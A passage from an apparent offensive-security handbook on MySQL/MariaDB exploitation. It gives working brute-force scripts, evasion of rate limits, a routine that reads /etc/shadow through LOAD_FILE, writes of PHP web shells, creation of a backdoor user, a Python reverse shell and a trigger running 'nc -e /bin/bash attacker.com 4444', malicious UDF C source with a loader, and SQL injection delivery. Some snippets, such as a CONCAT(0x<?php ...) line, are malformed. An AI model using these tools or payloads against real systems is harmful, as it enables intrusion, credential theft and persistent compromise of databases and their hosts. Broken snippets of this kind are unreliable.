if [ "$CURRENT" -gt "$THRESHOLD" ]; then
  echo "Alert: High NTP traffic detected" | mail -s "NTP Alert" admin@domain.com
fi
EOF

# Add to cron
echo "*/5 * * * * /etc/ntp_monitor.sh" | crontab -
```

---

**Important Related Topics:**

- Chrony exploitation (NTP alternative)
- Time-based attacks (Kerberos, certificates)
- PTP (Precision Time Protocol) security
- GPS time source manipulation
- Network Time Security (NTS) implementation

---

# DATABASE EXPLOITATION

## MySQL/MariaDB Exploitation

### Brute Force MySQL

MySQL brute force attacks attempt to gain database access by systematically testing username and password combinations against the database service.

#### Service Identification and Enumeration

Locate and fingerprint MySQL services:

```bash
# Port scanning for MySQL (default port 3306)
nmap -p 3306 target.com

# Service version detection
nmap -p 3306 -sV target.com

# MySQL-specific script scanning
nmap -p 3306 --script mysql-info target.com
nmap -p 3306 --script mysql-users target.com

# Banner grabbing
nc -v target.com 3306

# Using Metasploit scanner
msfconsole
> use auxiliary/scanner/mysql/mysql_version
> set RHOSTS target.com
> run

# Custom banner grab script
python3 << 'EOF'
import socket

def mysql_banner(host, port=3306):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        data = sock.recv(1024)
        sock.close()
        
        # MySQL protocol version 10
        if data[:1] == b'\x0a':
            print(f"[+] MySQL service detected on {host}:{port}")
            print(f"[*] Data: {data}")
            return True
    except:
        pass
    return False

mysql_banner("target.com")
EOF

# Detect MySQL on non-standard ports
nmap -p 1-65535 -T4 target.com | grep open | grep -E "mysql|3306"
```

#### Hydra MySQL Brute Force

Use Hydra for systematic MySQL credential testing:

```bash
# Basic MySQL brute force
hydra -l root -p password mysql://target.com

# Multiple usernames and passwords
hydra -L users.txt -P passwords.txt mysql://target.com

# Common MySQL usernames
echo -e "root\nadmin\nuser\ntest\nguest" > mysql_users.txt

# Weak password wordlist
hydra -L mysql_users.txt -P /usr/share/wordlists/rockyou.txt mysql://target.com

# Non-standard MySQL port
hydra -L users.txt -P passwords.txt mysql://target.com:3307

# Verbose output with attempt monitoring
hydra -L users.txt -P passwords.txt mysql://target.com -v

# Multiple threads for parallelization
hydra -L users.txt -P passwords.txt mysql://target.com -t 16

# Save results to file
hydra -L users.txt -P passwords.txt mysql://target.com -o /tmp/hydra_mysql.txt

# Exit on first success
hydra -L users.txt -P passwords.txt mysql://target.com -f
```

#### Medusa MySQL Brute Force

Alternative brute force approach using Medusa:

```bash
# Basic Medusa MySQL attack
medusa -h target.com -u root -P passwords.txt -M mysql

# Multiple hosts
medusa -H hosts.txt -u root -P passwords.txt -M mysql

# Multiple users
medusa -h target.com -U users.txt -P passwords.txt -M mysql

# Verbose output
medusa -h target.com -u root -P passwords.txt -M mysql -v 2

# Threading
medusa -h target.com -u root -P passwords.txt -M mysql -t 16

# Output to file
medusa -h target.com -u root -P passwords.txt -M mysql -O /tmp/medusa_mysql.txt

# Non-standard port
medusa -h target.com:3307 -u root -P passwords.txt -M mysql
```

#### Custom MySQL Brute Force Script

Develop targeted brute force implementation:

```python
#!/usr/bin/env python3
import mysql.connector
import sys
import time
from threading import Thread, Lock
from queue import Queue

class MySQLBruteForce:
    def __init__(self, target, port=3306, threads=4):
        self.target = target
        self.port = port
        self.threads = threads
        self.lock = Lock()
        self.found = False
        self.successful_creds = []
    
    def test_credentials(self, username, password):
        """Test single credential pair"""
        if self.found and len(self.successful_creds) > 0:
            return False
        
        try:
            connection = mysql.connector.connect(
                host=self.target,
                port=self.port,
                user=username,
                password=password,
                connection_timeout=5
            )
            
            if connection.is_connected():
                with self.lock:
                    print(f"\n[+] SUCCESS: {username}:{password}")
                    self.successful_creds.append((username, password))
                    self.found = True
                
                connection.close()
                return True
        except mysql.connector.errors.ProgrammingError:
            # Authentication failed
            pass
        except mysql.connector.errors.DatabaseError:
            # Other database error
            pass
        except Exception as e:
            # Connection timeout or other error
            pass
        
        return False
    
    def worker(self, credentials_queue):
        """Worker thread for credential testing"""
        while True:
            try:
                username, password = credentials_queue.get(timeout=1)
            except:
                break
            
            if not self.found:
                self.test_credentials(username, password)
    
    def brute_force(self, users, passwords):
        """Execute brute force attack"""
        print(f"[*] Connecting to MySQL on {self.target}:{self.port}")
        
        q = Queue()
        
        # Populate queue with credentials
        for user in users:
            for passwd in passwords:
                q.put((user, passwd))
        
        print(f"[*] Starting {self.threads} threads for {len(users)*len(passwords)} attempts")
        
        # Create and start worker threads
        thread_list = []
        for _ in range(self.threads):
            t = Thread(target=self.worker, args=(q,))
            t.start()
            thread_list.append(t)
        
        # Wait for completion
        for t in thread_list:
            t.join()
        
        if self.successful_creds:
            print(f"\n[+] Attack successful - {len(self.successful_creds)} credentials found")
            for creds in self.successful_creds:
                print(f"    {creds[0]}:{creds[1]}")
            return True
        else:
            print("[-] Attack failed - no credentials found")
            return False

# Usage
if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "target.com"
    
    users = ["root", "admin", "user", "guest", "test"]
    passwords = ["password", "123456", "admin", "letmein", "root"]
    
    brute_forcer = MySQLBruteForce(target, port=3306, threads=4)
    brute_forcer.brute_force(users, passwords)
```

#### Rate Limiting and Detection Evasion

Bypass brute force protections:

```bash
# Reduce thread count to avoid rapid failures
hydra -L users.txt -P passwords.txt mysql://target.com -t 1

# Add delays between attempts
#!/bin/bash
for user in $(cat users.txt); do
  for pass in $(cat passwords.txt); do
    mysql -h target.com -u "$user" -p"$pass" -e "SELECT 1;" 2>/dev/null && \
      echo "[+] $user:$pass" || true
    sleep 2
  done
done

# Monitor for connection errors indicating rate limiting
# "Too many connections" error suggests rate limiting

# Use multiple source IPs if available
# Through VPN, proxy rotation, or multiple interfaces

# Test for account lockout mechanisms
# Some MySQL installations lock accounts after N failed attempts
for i in {1..5}; do
  mysql -h target.com -u admin -pwrong -e "SELECT 1;" 2>&1
done

# Check for locked account indicators
# "Account is locked" or similar message
```

#### Network Traffic Analysis

Monitor MySQL authentication attempts:

```bash
# Capture MySQL traffic
tcpdump -i any -w mysql_traffic.pcap 'tcp port 3306'

# Monitor with ASCII output
tcpdump -i any -A 'tcp port 3306'

# Extract authentication attempts
tcpdump -i any -A 'tcp port 3306' | grep -E "mysql|password|USER"

# Parse captured traffic
python3 << 'EOF'
import struct

def parse_mysql_handshake(data):
    """Parse MySQL handshake packet"""
    # MySQL protocol version 10
    if data[0] != 10:
        return None
    
    # Extract version string
    version_end = data.find(b'\x00')
    version = data[1:version_end].decode()
    print(f"[*] MySQL Version: {version}")
    
    return version

# Read pcap and parse
with open('mysql_traffic.pcap', 'rb') as f:
    data = f.read()
    # Parse requires scapy or similar library
EOF

# Using Wireshark for analysis
wireshark mysql_traffic.pcap
# Filter: tcp.port == 3306
# Look for handshake and authentication packets
```

### Default Credentials

Many MySQL installations ship with default or no credentials. Testing for defaults enables easy compromise.

#### Common Default Credentials

Known default credentials for MySQL services:

```
Service                 Username        Password
─────────────────────────────────────────────────
MySQL                   root            (no password)
MySQL                   root            root
MySQL                   admin           admin
MySQL                   guest           guest
MariaDB                  root            (no password)
MariaDB                  root            root
Percona                  root            (no password)
AWS RDS MySQL           admin           (set during creation)
Google CloudSQL         root            (no password)
Azure MySQL             admin            (set during creation)
```

#### Testing Default Credentials

Systematically test known defaults:

```bash
# Create default credentials wordlist
cat > mysql_defaults.txt << 'EOF'
root:
root:root
root:password
root:123456
admin:admin
admin:password
guest:guest
test:test
user:user
EOF

# Test MySQL defaults
while IFS=: read user pass; do
  mysql -h target.com -u "$user" -p"$pass" -e "SELECT VERSION();" 2>/dev/null && \
    echo "[+] SUCCESS: $user:$pass"
done < mysql_defaults.txt

# Using hydra
hydra -L mysql_defaults.txt mysql://target.com

# Test anonymous access (no username/password)
mysql -h target.com -u "" -p "" -e "SELECT VERSION();"
mysql -h target.com -e "SELECT VERSION();"

# Check for open MySQL socket access
mysql --socket=/var/run/mysqld/mysqld.sock -e "SELECT VERSION();"
mysql --socket=/tmp/mysql.sock -e "SELECT VERSION();"
```

#### Vendor-Specific Defaults

Test manufacturer-specific credentials:

```bash
# AWS RDS MySQL
# Default username: admin
# Password: specified during creation
mysql -h target.rds.amazonaws.com -u admin -p

# Google Cloud SQL
# Default: root user with no password or specific password
mysql -h 35.xxx.xxx.xxx -u root -p

# Azure MySQL
# Default: admin@servername
mysql -h servername.mysql.database.azure.com -u admin@servername -p

# Docker MySQL Image
# MYSQL_ROOT_PASSWORD environment variable
# MYSQL_USER, MYSQL_PASSWORD for regular user

# Test with common container defaults
mysql -h localhost -u root -p
# Password often: "password" or derived from env vars

# cPanel MySQL
# cPanel user: cPanel user_database
# Password: randomly generated by cPanel

# Plesk MySQL
# plesk: Plesk admin password
# psa: "psa" or random
```

#### Automated Default Testing

Comprehensive default credential assessment:

```python
#!/usr/bin/env python3
import mysql.connector
import sys
import time

class MySQLDefaultTester:
    def __init__(self, target, port=3306):
        self.target = target
        self.port = port
        self.defaults = [
            ("root", ""),
            ("root", "root"),
            ("root", "password"),
            ("root", "123456"),
            ("root", "toor"),
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", ""),
            ("guest", "guest"),
            ("guest", ""),
            ("test", "test"),
            ("test", ""),
            ("user", "user"),
            ("user", "password"),
        ]
    
    def test_credentials(self, username, password):
        """Test MySQL credentials"""
        try:
            connection = mysql.connector.connect(
                host=self.target,
                port=self.port,
                user=username,
                password=password,
                connection_timeout=5
            )
            
            if connection.is_connected():
                # Get version
                cursor = connection.cursor()
                cursor.execute("SELECT VERSION()")
                version = cursor.fetchone()[0]
                cursor.close()
                connection.close()
                
                return True, version
        except:
            pass
        
        return False, None
    
    def test_all_defaults(self):
        """Test all default credentials"""
        print(f"[*] Testing default credentials on {self.target}:{self.port}")
        
        successful = []
        
        for username, password in self.defaults:
            # Display
            if password:
                print(f"[*] Trying: {username}:{password}", end="", flush=True)
            else:
                print(f"[*] Trying: {username}:(no password)", end="", flush=True)
            
            # Test
            success, version = self.test_credentials(username, password)
            
            if success:
                print(f" [+] SUCCESS (MySQL {version})")
                successful.append((username, password, version))
            else:
                print()
            
            time.sleep(0.2)  # Rate limiting
        
        if successful:
            print(f"\n[+] Found {len(successful)} valid default credentials:")
            for username, password, version in successful:
                if password:
                    print(f"    {username}:{password} (MySQL {version})")
                else:
                    print(f"    {username}:(no password) (MySQL {version})")
        else:
            print("\n[-] No default credentials found")
        
        return successful

# Usage
if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "target.com"
    
    tester = MySQLDefaultTester(target, port=3306)
    tester.test_all_defaults()
```

#### Post-Compromise Actions

Upon successful default credential access:

```bash
# Connect to MySQL
mysql -h target.com -u root -p

# Enumerate databases
SHOW DATABASES;

# Enumerate tables
USE database_name;
SHOW TABLES;

# Extract data
SELECT * FROM users;
SELECT * FROM accounts;
SELECT * FROM passwords;

# Identify sensitive tables
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA != 'information_schema';

# Extract all user accounts and hashes
SELECT user, authentication_string FROM mysql.user;

# Check for stored procedures (potential backdoors)
SELECT ROUTINE_NAME FROM INFORMATION_SCHEMA.ROUTINES;

# View database privileges
SELECT user, host, password FROM mysql.user;

# Automated enumeration script
python3 << 'EOF'
import mysql.connector

def enumerate_mysql(host, user, password):
    conn = mysql.connector.connect(
        host=host,
        user=user,
        password=password
    )
    
    cursor = conn.cursor()
    
    # Get version
    cursor.execute("SELECT VERSION()")
    print(f"[+] MySQL Version: {cursor.fetchone()[0]}")
    
    # Enumerate databases
    cursor.execute("SHOW DATABASES")
    databases = cursor.fetchall()
    print(f"[+] Databases: {databases}")
    
    # Enumerate users
    cursor.execute("SELECT user, host FROM mysql.user")
    users = cursor.fetchall()
    print(f"[+] Users:")
    for u in users:
        print(f"    {u[0]}@{u[1]}")
    
    # Get current user privileges
    cursor.execute("SELECT * FROM INFORMATION_SCHEMA.USER_PRIVILEGES")
    privileges = cursor.fetchall()
    print(f"[+] Privileges: {len(privileges)} entries")
    
    cursor.close()
    conn.close()

enumerate_mysql("target.com", "root", "")
EOF
```

### File Read/Write (INTO OUTFILE)

MySQL's `INTO OUTFILE` and `LOAD_FILE()` functions enable reading and writing files on the server filesystem, providing data exfiltration and code execution capabilities.

#### Understanding File Operations

MySQL file operation functions and their capabilities:

```bash
# INTO OUTFILE: Write query results to file
SELECT * INTO OUTFILE '/tmp/data.txt' FROM users;

# INTO DUMPFILE: Write binary data to file
SELECT * INTO DUMPFILE '/tmp/binary.bin' FROM table;

# LOAD_FILE(): Read file contents into query
SELECT LOAD_FILE('/etc/passwd');

# Conditions for exploitation:
# 1. Sufficient file system permissions
# 2. Database user has FILE privilege
# 3. File doesn't already exist (INTO OUTFILE)
# 4. Secure_file_priv not restrictive
```

#### Checking File Privilege Requirements

Verify file operation capabilities:

```sql
-- Check if current user has FILE privilege
SHOW GRANTS FOR CURRENT_USER();
-- Look for: GRANT ... FILE ...

-- Check secure_file_priv setting
SHOW VARIABLES LIKE 'secure_file_priv';
-- Empty string = any directory
-- NULL = file operations disabled
-- /path = restricted to /path

-- Check data directory
SHOW VARIABLES LIKE 'datadir';

-- Verify write permissions
SHOW VARIABLES LIKE 'tmpdir';
```

#### MySQL Terminal Commands

```bash
# Connect to MySQL
mysql -h target.com -u root -p

# Inside MySQL terminal:

# Check file privileges
SHOW GRANTS;

# Check file operation settings
SHOW VARIABLES WHERE variable_name IN ('secure_file_priv', 'datadir');

# Verify file reading capability
SELECT LOAD_FILE('/etc/hostname');

# Verify file writing capability
SELECT 'test' INTO OUTFILE '/tmp/test.txt';

# Write web shell to web directory
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# Exfiltrate sensitive files
SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/passwd_backup.txt';
```

#### File Reading Exploitation

Use LOAD_FILE to exfiltrate server data:

```python
#!/usr/bin/env python3
import mysql.connector
import sys

class MySQLFileReader:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.conn = None
    
    def connect(self):
        """Connect to MySQL"""
        try:
            self.conn = mysql.connector.connect(
                host=self.host,
                user=self.user,
                password=self.password
            )
            print(f"[+] Connected to MySQL on {self.host}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def check_file_privilege(self):
        """Check if FILE privilege is available"""
        try:
            cursor = self.conn.cursor()
            cursor.execute("SHOW GRANTS FOR CURRENT_USER()")
            grants = cursor.fetchall()
            cursor.close()
            
            for grant in grants:
                if 'FILE' in grant[0]:
                    print("[+] FILE privilege available")
                    return True
            
            print("[-] FILE privilege not available")
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def read_file(self, filepath):
        """Read file using LOAD_FILE"""
        try:
            cursor = self.conn.cursor()
            query = f"SELECT LOAD_FILE('{filepath}')"
            cursor.execute(query)
            result = cursor.fetchone()
            cursor.close()
            
            if result and result[0]:
                return result[0]
            else:
                return None
        except Exception as e:
            print(f"[-] Error reading {filepath}: {e}")
            return None
    
    def read_multiple_files(self, filepaths):
        """Read multiple files"""
        results = {}
        
        for filepath in filepaths:
            print(f"[*] Reading: {filepath}")
            content = self.read_file(filepath)
            
            if content:
                results[filepath] = content
                print(f"[+] Successfully read: {filepath}")
            else:
                print(f"[-] Failed to read: {filepath}")
        
        return results
    
    def close(self):
        """Close connection"""
        if self.conn:
            self.conn.close()

# Usage
if __name__ == "__main__":
    reader = MySQLFileReader("target.com", "root", "")
    
    if reader.connect():
        if reader.check_file_privilege():
            # Read sensitive files
            files_to_read = [
                '/etc/passwd',
                '/etc/shadow',
                '/etc/mysql/my.cnf',
                '/proc/self/environ',
                '/var/www/html/config.php'
            ]
            
            results = reader.read_multiple_files(files_to_read)
            
            # Display results
            for filepath, content in results.items():
                print(f"\n=== {filepath} ===")
                print(content[:500] if len(content) > 500 else content)
        
        reader.close()
```

#### File Writing Exploitation

Write files to achieve code execution:

```python
#!/usr/bin/env python3
import mysql.connector
import sys
import urllib.parse

class MySQLFileWriter:
    def __init__(self, host, user, password, database=None):
        self.host = host
        self.user = user
        self.password = password
        self.database = database
        self.conn = None
    
    def connect(self):
        """Connect to MySQL"""
        try:
            kwargs = {
                'host': self.host,
                'user': self.user,
                'password': self.password
            }
            if self.database:
                kwargs['database'] = self.database
            
            self.conn = mysql.connector.connect(**kwargs)
            print(f"[+] Connected to MySQL on {self.host}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def check_file_privilege(self):
        """Check if FILE privilege is available"""
        try:
            cursor = self.conn.cursor()
            cursor.execute("SHOW GRANTS FOR CURRENT_USER()")
            grants = cursor.fetchall()
            cursor.close()
            
            for grant in grants:
                if 'FILE' in grant[0]:
                    print("[+] FILE privilege available")
                    return True
            
            print("[-] FILE privilege not available")
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def write_file(self, filepath, content):
        """Write file using INTO OUTFILE"""
        try:
            cursor = self.conn.cursor()
            
            # Escape content for SQL
            escaped_content = content.replace("'", "\\'").replace("\\", "\\\\")
            
            query = f"SELECT '{escaped_content}' INTO OUTFILE '{filepath}'"
            cursor.execute(query)
            self.conn.commit()
            cursor.close()
            
            print(f"[+] File written: {filepath}")
            return True
        except Exception as e:
            print(f"[-] Error writing {filepath}: {e}")
            return False
    
    def write_web_shell(self, webroot, shell_filename):
        """Write PHP web shell"""
        php_shell = '''<?php
system($_GET["cmd"]);
?>'''
        
        filepath = f"{webroot}/{shell_filename}"
        return self.write_file(filepath, php_shell)
    
    def write_backdoor_user(self, username, password_hash):
        """Add backdoor MySQL user"""
        try:
            cursor = self.conn.cursor()
            
            # Create user with all privileges
            query = f"GRANT ALL PRIVILEGES ON *.* TO '{username}'@'%' IDENTIFIED BY '{password_hash}' WITH GRANT OPTION"
            cursor.execute(query)
            self.conn.commit()
            
            cursor.close()
            print(f"[+] Backdoor user created: {username}")
            return True
        except Exception as e:
            print(f"[-] Error creating user: {e}")
            return False
    
    def close(self):
        """Close connection"""
        if self.conn:
            self.conn.close()

# Usage
if __name__ == "__main__":
    writer = MySQLFileWriter("target.com", "root", "", database="mysql")
    
    if writer.connect():
        if writer.check_file_privilege():
            # Write web shell
            writer.write_web_shell("/var/www/html", "shell.php")
            
            # Alternative: Write to /tmp and execute
            writer.write_file("/tmp/backdoor.py", "import os; os.system('whoami')")
        
        writer.close()
```

#### Web Shell Deployment

Deploy executable code via file writing:

```bash
# PHP web shell
php_payload='<?php system($_GET["cmd"]); ?>'
mysql -h target.com -u root -e "SELECT '$php_payload' INTO OUTFILE '/var/www/html/shell.php'"

# Access shell via HTTP
curl "http://target.com/shell.php?cmd=id"

# Python backdoor
python_payload='import subprocess, socket; s=socket.socket(); s.connect(("attacker.com",4444)); subprocess.Popen(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
mysql -h target.com -u root -e "SELECT '$python_payload' INTO DUMPFILE '/tmp/backdoor.py'"

# Execute via cron or application
mysql -h target.com -u root -e "SELECT 'python /tmp/backdoor.py' INTO OUTFILE '/etc/cron.d/backdoor'"
```

#### INTO DUMPFILE vs INTO OUTFILE

Differences and exploitation nuances:

```sql
-- INTO OUTFILE
-- Writes query results as text file
-- Each row on separate line
-- Column separator configurable
-- Restricted by secure_file_priv
-- Fails if file exists
SELECT data INTO OUTFILE '/tmp/file.txt' FROM table;

-- INTO DUMPFILE
-- Writes raw binary data
-- No field separators or line terminators
-- Better for binary content
-- Also restricted by secure_file_priv
SELECT UNHEX('504b0304') INTO DUMPFILE '/tmp/file.bin';

-- Combined with FIELDS and LINES options
SELECT * INTO OUTFILE '/tmp/file.csv'
  FIELDS TERMINATED BY ','
  LINES TERMINATED BY '\n'
  FROM table;

-- Writing files with specific content
SELECT CONCAT(0x<?php system($_GET['c']); ?>)
INTO OUTFILE '/var/www/html/shell.php';
```

#### Bypassing secure_file_priv

Techniques to circumvent file operation restrictions:

```sql
-- Check current setting
SHOW VARIABLES LIKE 'secure_file_priv';

-- If secure_file_priv is set to specific directory, write there
SELECT 'content' INTO OUTFILE '/var/lib/mysql-files/shell.php';

-- If NULL (file operations disabled), exploit may fail
-- Unless configuration can be modified

-- Workaround: Use symlinks (if possible)
-- Create symlink to target directory
-- Then write to symlink location

-- Alternative: Use database functions that write files
-- Some versions support sys_exec() or similar
SELECT sys_exec("echo 'payload' > /tmp/file");
```

### User-Defined Function (UDF) Loading

UDFs allow loading compiled shared libraries into MySQL for arbitrary code execution.

#### Understanding UDF Exploitation

UDF fundamentals and exploitation methods:

```bash
# UDFs are C/C++ compiled libraries (.so on Linux, .dll on Windows)
# Loaded into MySQL process memory
# Execute with MySQL process privileges (often root)

# Vulnerable versions:
# MySQL 5.x and earlier vulnerable by default
# MySQL 5.5+ requires mysql_upgrade to fully enable UDF restrictions
# MariaDB similar vulnerability patterns
```

#### UDF Source Code Creation

Develop malicious UDF library:

```cpp
// udf_shell.c - Malicious UDF for command execution
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

#ifdef __WIN__
typedef unsigned int uint;
typedef unsigned long ulong;
#endif

unsigned long dlength,maxlength;
char globbuf[512];
char *p;
char *pe;
int g_field_lengths[512];
int *field_lengths;

// Function declaration expected by MySQL
#define MYSQL_UDF_CHR_FUNCTIONS 1
#define MYSQL_UDF_REAL_FUNCTIONS 1

extern "C" {
    #ifdef __WIN__
    __declspec(dllexport)
    #endif
    
    // System command execution function
    char * sys_exec(UDF_INIT *initid, UDF_ARGS *args, 
                    char *result, unsigned long *length,
                    char *is_null, char *error) {
        FILE *fp;
        char buf[512];
        
        if (args->arg_count != 1) {
            *is_null = 1;
            return result;
        }
        
        if (!(fp = popen(args->args[0], "r"))) {
            *is_null = 1;
            return result;
        }
        
        memset(buf, '\0', sizeof(buf));
        
        while (fgets(buf, sizeof(buf), fp) != NULL) {
            strcat(result, buf);
        }
        
        pclose(fp);
        
        *length = strlen(result);
        
        return result;
    }
    
    // Init function
    my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args,
                          char *message) {
        initid->maybe_null = 1;
        initid->max_length = 512;
        initid->ptr = (char*) malloc(512);
        return 0;
    }
    
    // Deinit function
    void sys_exec_deinit(UDF_INIT *initid) {
        if (initid->ptr) {
            free(initid->ptr);
        }
    }
}
```

Compile the UDF:

```bash
# On Linux
gcc -shared -fPIC -o udf_shell.so udf_shell.c

# On Windows (requires Visual Studio)
# cl /LD udf_shell.c

# Verify compilation
file udf_shell.so
# Should output: ELF 64-bit shared object
```

#### UDF Installation

Load compiled UDF into MySQL:

```sql
-- Copy UDF library to plugin directory
-- Default locations:
-- /usr/lib/mysql/plugin/ (Linux)
-- C:\Program Files\MySQL\MySQL Server 5.7\lib\plugin (Windows)

-- Inside MySQL terminal:

-- Create FUNCTION pointing to UDF
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf_shell.so';

-- Use the function
SELECT sys_exec('id');
SELECT sys_exec('whoami');
SELECT sys_exec('cat /etc/passwd');
```

#### UDF Loading via INTO OUTFILE

Write and load UDF library:

```python
#!/usr/bin/env python3
import mysql.connector
import base64
import sys

class UDFLoader:
    def __init__(self, host, user, password, database=None):
        self.host = host
        self.user = user
        self.password = password
        self.database = database
        self.conn = None
        self.plugin_dir = None
    
    def connect(self):
        """Connect to MySQL"""
        try:
            kwargs = {
                'host': self.host,
                'user': self.user,
                'password': self.password
            }
            if self.database:
                kwargs['database'] = self.database
            
            self.conn = mysql.connector.connect(**kwargs)
            print(f"[+] Connected to MySQL on {self.host}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def find_plugin_directory(self):
        """Find MySQL plugin directory"""
        try:
            cursor = self.conn.cursor()
            cursor.execute("SHOW VARIABLES LIKE 'plugin_dir'")
            result = cursor.fetchone()
            cursor.close()
            
            if result:
                self.plugin_dir = result[1]
                print(f"[+] Plugin directory: {self.plugin_dir}")
                return self.plugin_dir
            else:
                print("[-] Could not determine plugin directory")
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None
    
    def upload_udf_binary(self, udf_binary, filename):
        """Upload compiled UDF binary to plugin directory"""
        try:
            cursor = self.conn.cursor()
            
            # Convert binary to hex string for INSERT
            hex_binary = udf_binary.hex()
            
            # Create temporary table
            cursor.execute("CREATE TEMPORARY TABLE udf_table (udf_binary LONGBLOB)")
            
            # Insert binary data
            cursor.execute(f"INSERT INTO udf_table VALUES (UNHEX('{hex_binary}'))")
            
            # Write to file
            filepath = f"{self.plugin_dir}/{filename}"
            cursor.execute(f"SELECT udf_binary INTO DUMPFILE '{filepath}' FROM udf_table")
            
            self.conn.commit()
            cursor.close()
            
            print(f"[+] UDF uploaded to {filepath}")
            return True
        except Exception as e:
            print(f"[-] Error uploading UDF: {e}")
            return False
    
    def create_udf_function(self, function_name, udf_filename):
        """Create MySQL UDF function"""
        try:
            cursor = self.conn.cursor()
            query = f"CREATE FUNCTION {function_name} RETURNS STRING SONAME '{udf_filename}'"
            cursor.execute(query)
            self.conn.commit()
            cursor.close()
            
            print(f"[+] UDF function created: {function_name}")
            return True
        except Exception as e:
            print(f"[-] Error creating function: {e}")
            return False
    
    def execute_udf(self, function_name, command):
        """Execute command via UDF"""
        try:
            cursor = self.conn.cursor()
            query = f"SELECT {function_name}('{command}')"
            cursor.execute(query)
            result = cursor.fetchone()
            cursor.close()
            
            if result:
                return result[0]
            return None
        except Exception as e:
            print(f"[-] Error executing UDF: {e}")
            return None
    
    def close(self):
        """Close connection"""
        if self.conn:
            self.conn.close()

# Usage
if __name__ == "__main__":
    loader = UDFLoader("target.com", "root", "", database="mysql")
    
    if loader.connect():
        loader.find_plugin_directory()
        
        # Read compiled UDF binary
        try:
            with open("udf_shell.so", "rb") as f:
                udf_binary = f.read()
            
            # Upload UDF
            loader.upload_udf_binary(udf_binary, "udf_shell.so")
            
            # Create function
            loader.create_udf_function("sys_exec", "udf_shell.so")
            
            # Execute command
            result = loader.execute_udf("sys_exec", "id")
            print(f"[+] Command output: {result}")
        except Exception as e:
            print(f"[-] Error: {e}")
        
        loader.close()
```

#### UDF Pre-Compiled Binaries

Use pre-built UDF exploits:

```bash
# Metasploit module for UDF exploitation
msfconsole
> use exploit/mysql/mysql_udf_injection
> set RHOSTS target.com
> set USERNAME root
> set PASSWORD ""
> set PAYLOAD cmd/unix/reverse_bash
> set LHOST attacker.com
> set LPORT 4444
> run

# Manual UDF exploitation framework
# https://github.com/mysqludf/lib_mysqludf_sys

# Download and compile
git clone https://github.com/mysqludf/lib_mysqludf_sys.git
cd lib_mysqludf_sys
gcc -shared -fPIC -o lib_mysqludf_sys.so lib_mysqludf_sys.c

# Upload and load
mysql -h target.com -u root -p << EOF
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('whoami');
EOF
```

#### Alternative UDF Loading Methods

Bypass restrictions on library loading:

```sql
-- Method 1: INTO OUTFILE to plugin directory
SELECT LOAD_FILE('/path/to/udf.so') INTO OUTFILE '/usr/lib/mysql/plugin/udf.so';

-- Method 2: Direct compilation within database
-- Not typically possible, but can write C source and compile externally

-- Method 3: Use existing vulnerable UDFs
-- Some installations may have legacy UDFs with command execution

-- Method 4: Exploit UDF loading race conditions
-- If multiple processes write to plugin directory simultaneously

-- Method 5: Leverage symlinks
-- Create symlink to writable directory
-- Load from symlink location

-- Check loaded UDFs
SELECT * FROM INFORMATION_SCHEMA.PLUGINS WHERE PLUGIN_NAME LIKE '%sys%';

-- List available UDFs
SELECT ROUTINE_NAME FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_SCHEMA = 'mysql';
```

#### UDF Exploitation via SQL Injection

Leverage SQL injection to execute UDF commands:

```python
#!/usr/bin/env python3
import requests
import sys

class UDFSQLInjection:
    def __init__(self, target_url, injection_parameter):
        self.target_url = target_url
        self.injection_parameter = injection_parameter
    
    def inject_command(self, command):
        """Inject UDF command via SQL injection"""
        # Payload: ' UNION SELECT sys_exec('command') --
        payload = f"' UNION SELECT sys_exec('{command}') -- "
        
        params = {
            self.injection_parameter: payload
        }
        
        try:
            response = requests.get(self.target_url, params=params, timeout=10)
            return response.text
        except Exception as e:
            print(f"[-] Error: {e}")
            return None
    
    def enumerate_udf(self):
        """Enumerate available UDFs"""
        payload = "' UNION SELECT ROUTINE_NAME FROM INFORMATION_SCHEMA.ROUTINES -- "
        
        params = {
            self.injection_parameter: payload
        }
        
        try:
            response = requests.get(self.target_url, params=params, timeout=10)
            return response.text
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

# Usage
if __name__ == "__main__":
    injector = UDFSQLInjection("http://target.com/user.php", "id")
    
    # Enumerate UDFs
    udf_list = injector.enumerate_udf()
    print(f"[*] Available UDFs: {udf_list}")
    
    # Execute command
    result = injector.inject_command("id")
    print(f"[+] Command output: {result}")
```

#### UDF Persistence

Maintain access via UDF backdoors:

```sql
-- Create permanent UDF function
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf_shell.so';

-- Create backdoor procedure using UDF
DELIMITER //
CREATE PROCEDURE backdoor_proc(cmd VARCHAR(500))
BEGIN
  SELECT sys_exec(cmd);
END//
DELIMITER ;

-- Add event for scheduled execution
CREATE EVENT backdoor_event
ON SCHEDULE EVERY 1 MINUTE
DO CALL backdoor_proc('echo "persistent" >> /tmp/backdoor.log');

-- Create trigger for persistence
CREATE TRIGGER backdoor_trigger
AFTER INSERT ON mysql.user
FOR EACH ROW
SELECT sys_exec('nc -e /bin/bash attacker.com 4444');
```

#### UDF Limitation and Detection

Understand restrictions and evasion:

```bash
# Requirements for UDF exploitation:
# 1. FILE privilege on target user
# 2. Writable plugin directory
